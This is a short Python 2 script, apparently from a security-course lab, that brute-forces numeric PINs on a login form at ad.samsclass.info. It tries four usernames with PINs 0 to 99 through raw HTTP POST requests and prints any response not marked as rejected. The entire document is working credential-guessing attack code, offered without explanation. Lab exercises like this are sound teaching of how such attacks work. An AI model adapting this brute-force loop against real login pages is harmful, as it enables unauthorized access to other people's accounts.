import socket

target = 'ad.samsclass.info'

user = ["bill", "ted", "sally", "sue"]

req = """POST /python/login2r.php HTTP/1.1
Host: ad.samsclass.info
Connection: keep-alive
Content-Length: """

req2 = """
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: null
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
DNT: 1
Accept-Language: en-US,en;q=0.9
Cookie: __cfduid=d2bd20e1223a47d23d67bc7c4758ac6341523818211

u="""


for name in user:
    s = socket.socket()
    s.settimeout(2)
    s.connect((target, 80))
    
    for pin in range(100):
        req3 = name + "&p=" + str(pin)
        length = str(len(name) + len(str(pin)) + 5)
        s.send(req + length + req2 + req3)
        rx = s.recv(1024)
        fail = "Credentials rejected!"
        if fail in rx:
            pass
        else:
            print rx
        
    s.close()
